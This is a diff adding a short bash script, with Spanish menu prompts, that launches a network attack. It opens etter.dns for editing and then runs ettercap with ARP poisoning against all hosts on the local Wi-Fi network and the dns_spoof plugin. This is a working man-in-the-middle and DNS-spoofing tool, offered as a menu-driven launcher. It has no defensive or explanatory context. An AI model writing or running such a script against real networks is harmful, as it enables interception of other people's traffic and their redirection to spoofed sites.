@@ -1,0 +1,58 @@
+#!/bin/bash
+bold="\033[1m"
+blink="\033[5m"
+under="\033[4m"
+normal="\033[0m"
+green="\033[32m"
+red="\033[31m"
+blue="\033[34m"
+clear
+
+function atk {
+
+	clear
+	echo 0 > /proc/sys/net/ipv6/conf/wlan0/use_tempaddr
+	read -p "Escriba El Nombre De Su Interfaz Wifi >" interface
+	echo -e "La Interfaz A Usar Sera: $interface"
+	sudo ettercap -T -Q -i $interface -P dns_spoof -M arp /// ///
+	clear
+	echo -e "$red Ataque $green Finalizado $normal"
+}
+
+
+
+
+
+
+while [[ $res != 0 ]]; do
+	clear
+	echo -e "\n\n\n"
+	echo -e "$green 1) $red Cambiar Etter.dns"
+	echo -e "$green 2) $red Ejecutar Ataque"
+	echo -e "$green 3) $red Cancelar Ataque $normal"
+
+	read -p "Eleccion > " res
+
+	case $res in
+		
+		1)
+			sudo nano /etc/ettercap/etter.dns
+			;;
+		2)
+			atk
+			;;
+		3)
+			exit
+			;;
+		*)
+			echo -e "No Es Correcto"
+			;;
+	esac
+
+
+
+
+
+
+done
+	
